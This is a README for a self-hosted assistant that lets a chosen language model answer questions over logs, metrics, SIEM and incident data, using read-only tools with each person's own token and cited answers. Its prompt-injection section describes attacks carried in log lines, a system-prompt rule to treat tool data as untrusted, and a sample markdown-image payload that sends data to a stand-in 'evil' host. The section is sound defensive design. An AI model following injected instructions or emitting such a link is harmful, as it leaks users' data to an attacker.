# assistant

[![CI](https://github.com/openasy/assistant/actions/workflows/ci.yml/badge.svg)](https://github.com/openasy/assistant/actions/workflows/ci.yml)
[![Node.js 26 LTS](https://img.shields.io/badge/node-26%20LTS-339933?logo=nodedotjs&logoColor=white)](./.nvmrc)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](./LICENSE)

The [OpenAsy](https://github.com/openasy) Assistant product: **questions across products in plain language, with
answers that cite their sources** (ADR 0073). The answer to "did anything unusual happen on web-2 yesterday?" is
spread over Logs, Metrics, SIEM and Incidents, each with its own query language. Assistant takes the question, lets a
language model you choose look it up with tools that only read those products' public APIs, with the asking
person's own token for each, and answers with every call it made, each linked to the page where the person sees the
same data.

```
question ──▶ assistant ──▶ language model (yours: Ollama, vLLM, llama.cpp, or Anthropic)
                 │  ▲              │ asks for read-only tools
                 ▼  │              ▼
          logs_search, metrics_query, traces_search, siem_signals, alerts_groups,
          incidents_list, incidents_get, vulnerabilities_findings
                 │  GET with the person's own token, checked, cut to size
                 ▼
          Logs, Metrics, Traces, SIEM, Alerts, Incidents, Vulnerabilities ──▶ answer with [1][2], linked
```

## Your data stays yours

- **No model is set up after install, and nothing is sent anywhere** until an admin sets one under Model (ADR 0015).
  Questions are refused until then.
- **Any server with OpenAI's chat completions and tool calling** works, which is what a local
  [Ollama](https://ollama.com) (`http://ollama:11434/v1`), vLLM (`http://vllm:8000/v1`) or llama.cpp server speaks.
  That is the recommended setup: the model runs where you decide and the data never leaves your network. The
  **Anthropic Messages API** is supported too, for installs that choose it.
- **The Model page says plainly where data goes**: every question, the earlier turns of its conversation and
  everything the tools return for it are sent to the model's address, which the page names, with whether it is on
  this host, a private network or the internet as far as its address tells. Everyone can read it, not only admins.
- **The model's API key** is sealed with the install's key (`openasy-kek`, AES-256-GCM, ADR 0021), never sent back
  and forgotten when the address or the API changes, so it only ever goes where it was given for.

## Read-only, as the person asking

- **A fixed set of tools.** The model can call only these, and each is one `GET` of one path of a product's public
  API (ADR 0014). It fills in arguments; it never chooses a method, host or path.

  | Tool | Product | Reads |
  | --- | --- | --- |
  | `logs_search` | Logs | `GET /api/v1/search`: LogsQL, at most 100 lines |
  | `metrics_query` | Metrics | `GET /prometheus/api/v1/query_range`: PromQL, each series summed up with 12 points |
  | `traces_search` | Traces | `GET /api/v1/traces`: by service, operation, failure, duration; at most 20 |
  | `siem_signals` | SIEM | `GET /api/v1/signals`: by status, severity, host; at most 50 |
  | `alerts_groups` | Alerts | `GET /api/v1/groups`: by state |
  | `incidents_list` | Incidents | `GET /api/v1/incidents`: by status, severity, text; at most 50 |
  | `incidents_get` | Incidents | `GET /api/v1/incidents/{key}`: one incident with its timeline |
  | `vulnerabilities_findings` | Vulnerabilities | `GET /api/v1/vulnerabilities`: by severity, KEV, fix, text; at most 50 |

- **Each person's own token.** Under Sources, each person connects a token of each product, made there under
  Settings, API tokens. Every call that product gets for their question is made with it, so an answer holds nothing
  they could not open in that product themselves (ADR 0003). There is no shared or admin token. A token is checked
  before it is kept: the address must be that product, the product must accept it, and a token that can list the
  product's API tokens (admin or owner) is refused, since Assistant only reads. Tokens are sealed like the model's
  key, never sent back, and dropped for everyone when an admin changes the product's address.
- **Arguments are checked** against each tool's parameters before anything is sent: unknown parameters, wrong types,
  values out of bounds and control characters are refused, and the model is told why. **Time windows** are at most
  7 days, within the last 30 days, never in the future. **Results** are cut to 12 KiB per call, with strings cut to
  400 characters; a product's answer over 2 MB is refused. Every call has a 10 second timeout and one retry when the
  product is unreachable (ADR 0023).
- **At most 10 tool calls and 6 model turns** per question; then the model is told to answer with what it has. One
  question per person at a time.

## Citations

Every answer lists every call it made, numbered, with its arguments, what it read and how much, and a link to the
product's page with the same query (Logs' Explorer, Metrics' Explore, SIEM's signals, the incident). The model cites
calls as `[n]`; a citation of a call that read nothing or was never made is taken out. A paragraph that cites no
call is marked "No source", and when no call read anything, the answer says that nothing in it comes from a source.

The products' pages take a range that ends now, such as `24h`, so a link opens the shortest range that holds the
window the tool read.

## Tool results are data, not instructions

Log lines, signal names and incident notes are written by whoever can make a service log something, which makes
them the main way to attack an assistant (prompt injection). Assistant:

- sends tool results back only as the tool's own result, as JSON with every string escaped and cut, never in the
  system prompt or the person's message; the system prompt tells the model that this data is untrusted and that
  instructions in it are not followed;
- gives an injection nothing to do: the tools only read, with the asking person's token, and what they read goes to
  that same person;
- makes nothing the model writes live: answers are shown as text, with no link, image or markup rendered, so an
  injected `![](https://evil/?data=...)` is never fetched; the links people click are built by the server from the
  product's address and the tool's arguments. The content security policy allows no image from elsewhere.

## Conversations

Kept per person, and only ever shown to that person: an admin of Assistant does not list or open another person's
conversations, since they hold what that person's tokens could read. Admins set how long they are kept (30 days by
default, 1 to 400); conversations whose last question is older are deleted. Each person can delete their own.

The audit log (ADR 0013) has every question: who asked, in which conversation, every call made in their name with
its arguments and status, the model and its host. It does not have what the tools returned. Changes to the model,
the sources, the retention and people's tokens are audit events too.

## Run

```bash
openssl rand -hex 32 > openasy-kek
docker compose up -d
docker compose logs assistant | grep 'no owner yet'
```

Open the link from the log once to create the owner account; there is no default password (ADR 0013). The UI and API
are on http://localhost:8080, the API reference at http://localhost:8080/api/docs/. Then, as an admin:

1. Under **Model**, set the model, such as an Ollama in the same compose project (uncomment it in compose.yaml):
   OpenAI-compatible, `http://ollama:11434/v1`, `llama3.1:8b` or another model that can call tools. **Check** sends
   it one short message.
2. Under **Sources**, allow the products to read and give their API addresses (from `OPENASY_PRODUCTS` by default)
   and the addresses people open them at.

Each person then connects their own tokens under **Sources** and asks under **Ask**.

| Variable | Default | |
| --- | --- | --- |
| `PORT` | `8080` | HTTP port |
| `ASSISTANT_PUBLIC_URL` | `http://localhost:8080` | The address people open, with `https://` behind your TLS proxy |
| `OPENASY_PRODUCTS` | | The install's other OpenAsy products: the switcher, and where sources are read until set |
| `ASSISTANT_RETENTION_DAYS` | `30` | How long conversations are kept until an admin sets it, 1 to 400 |
| `ASSISTANT_MODEL_TIMEOUT_SECONDS` | `120` | The longest one model turn may take, 5 to 600 |
| `ASSISTANT_SECRETS_KEY_FILE` | `/run/secrets/openasy-kek` | 32-byte key-encryption key; without it no token or model key can be kept |
| `ASSISTANT_DB` | `/data/assistant.db` | SQLite file (WAL), on the `/data` volume |
| `ASSISTANT_METRICS_PORT` | | Serve `/metrics` on this port only (ADR 0026) |
| `ASSISTANT_HEADLESS` | `false` | `true` serves only the API |
| `ASSISTANT_PASSWORD_SIGN_IN`, `OPENASY_OIDC_*` | | Sign-in, as in every OpenAsy product ([@openasy/auth](https://github.com/openasy/auth)) |

`/metrics` has `openasy_assistant_questions_total` by outcome (answered, no-data, failed),
`openasy_assistant_tool_calls_total` by tool and status, `openasy_assistant_model_configured`,
`openasy_assistant_sources_allowed`, `openasy_assistant_connections` and `openasy_assistant_conversations`.

The container runs as non-root with a read-only root filesystem, no capabilities and `no-new-privileges`.

## Roles

Viewers and editors ask, connect their own tokens and keep their own conversations; admins also set the model, the
sources and the retention, and manage members and API tokens (ADR 0003). An API token of Assistant is its own
person: it has its own connected products and conversations, for scripts.

## Not yet

- **Each person's own token is pasted by hand.** In `@openasy/auth` only admins create API tokens, so a viewer of
  Logs asks a Logs admin for a viewer token. Tokens made for a person by exchange through Identity, scoped to what
  they may read and short-lived, would replace this.
- More tools: Infrastructure's hosts and changes, Uptime, Malware, Secrets findings without values, Access grants,
  trace details and SIEM events. Products not in the list cannot be allowed yet.
- Answers are returned when done, not streamed; a slow local model holds the request up to its timeout per turn.
- Charts in answers, rating answers, the Usage page, asking from another product's page, and export of a person's
  conversations (GDPR Art. 15).
- When a member is removed from Assistant, their connected tokens and conversations are not deleted with them yet;
  nobody else can use or read them, since they belong to that person only.

## Develop

```bash
npm install
npm test        # the tools, their limits, citations, both model APIs, permissions per person, and every API response against openapi.json
npm run dev     # the UI, with the API on :8080
node scripts/openapi.ts   # after changing the API
bash e2e/run.sh assistant:dev   # the image, a stub model and stub products in containers: one question answered with its citations
```

The tests start a fake model server, which answers in OpenAI's or Anthropic's shape what each test scripts, and
fake products, which answer each person's token differently; no hosted model is ever called.

## Licence

AGPL-3.0 (ADR 0008).
